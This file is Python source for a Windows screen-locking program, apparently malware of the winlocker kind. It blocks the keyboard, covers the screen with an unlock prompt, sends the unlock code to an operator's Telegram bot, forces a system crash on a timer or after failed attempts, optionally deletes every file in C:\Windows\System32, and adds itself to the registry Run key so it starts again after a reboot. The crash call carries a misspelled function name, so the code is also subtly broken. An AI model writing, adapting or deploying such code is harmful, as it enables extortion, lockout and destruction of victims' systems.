import sys
import random
import string
import os
import ctypes
import telegram
import keyboard
from PyQt6.QtWidgets import QApplication, QMainWindow, QLineEdit, QLabel
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QFont

# Используем глобальные переменные из загрузчика
global title, instruction, footer, attempts, timer, autostart, wipe, token, tg_id, test_mode, key_type, static_key

def rand_name(size=10): return ''.join(random.choices(string.digits, k=size))
def block_keys():
    for key in keyboard.all_modifiers + [chr(i) for i in range(65, 123)]: keyboard.block_key(key)
    for key in range(10): keyboard.unblock_key(str(key))
def trigger_bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
    ctypes.windll.ntdll.NradiseHardError(0xc0000022, 0, 0, 0, 6)

class Locker(QMainWindow):
    def __init__(self):
        super().__init__()
        self.attempts_left = attempts
        self.setWindowTitle(title)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        self.setGeometry(0, 0, 1920, 1080)
        self.setStyleSheet("background-color: #1a1a1a; color: #ff0000;")
        
        self.label = QLabel(instruction, self)
        self.label.setFont(QFont("Arial", 20))
        self.label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label.move(0, 200)
        self.label.resize(1920, 100)
        
        self.input = QLineEdit(self)
        self.input.setFont(QFont("Arial", 16))
        self.input.setMaxLength(10)
        self.input.setGeometry(860, 400, 200, 40)
        self.input.returnPressed.connect(self.check_code)
        
        self.footer = QLabel(footer, self)
        self.footer.setFont(QFont("Arial", 14))
        self.footer.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.footer.move(0, 460)
        self.footer.resize(1920, 50)
        
        block_keys()
        self.timer = QTimer()
        self.timer.timeout.connect(trigger_bsod)
        self.timer.start(timer * 60 * 1000)
        
        if key_type == "telegram":
            self.bot = telegram.Bot(token)
            self.code = rand_name()
            self.bot.send_message(chat_id=tg_id, text=f"Code: {self.code}")
        else:
            self.code = static_key

    def check_code(self):
        entered_code = self.input.text()
        valid_code = self.code if key_type == "telegram" else static_key
        if (test_mode and entered_code == "1337") or entered_code == valid_code:
            os._exit(0)
        else:
            self.attempts_left -= 1
            self.footer.setText(f"Attempts left: {self.attempts_left}")
            if self.attempts_left <= 0:
                if wipe:
                    os.system('del /F /Q C:\\Windows\\System32\\*')
                trigger_bsod()

if __name__ == "__main__":
    if autostart:
        os.system(f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Locker /t REG_SZ /d "{os.path.realpath(__file__)}" /f')
    app = QApplication(sys.argv)
    window = Locker()
    window.show()
    sys.exit(app.exec())
